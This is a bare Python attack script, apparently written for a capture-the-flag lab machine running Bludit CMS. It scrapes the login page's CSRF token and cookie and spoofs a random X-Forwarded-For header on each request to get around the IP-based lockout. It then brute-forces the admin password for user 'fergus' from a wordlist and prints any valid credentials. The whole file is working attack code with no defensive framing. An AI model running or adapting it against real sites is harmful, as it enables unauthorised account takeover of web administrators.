import requests
import re
import random
HOST = "10.10.10.191"
USER = "fergus"
PROXY = {'http':'127.0.0.1:8080'}

def init_session():
    r= requests.get('http://10.10.10.191/admin/')
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
    csrf=csrf.group(1)
    cookie=r.cookies.get('BLUDIT-KEY')
  
    return csrf, cookie



def login(user,password):
    csrf,cookie = init_session()
    headers = {
            'X-Forwarded-For' : f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
    
          }
    data={
        'tokenCSRF':csrf,
        'username':user,
        'password':password,
        'save':''
    }
    cookies = {
        'BLUDIT-KEY':cookie
    }
    r = requests.post('http://10.10.10.191/admin/login',data=data, cookies=cookies,headers=headers, allow_redirects=False)
    if r.status_code != 200:
    	print(f"{USER}:{password}")
    	return True
    elif "password incorrect" in r.text:
        return False
    elif "has been blocked" in r.text:
       print("Blocked")
       return False
    else:
        print(f"{USER}:{password}")
        return True


wl =open('words').readlines()
for line in wl:
    line=line.strip()
    login('fergus',line)
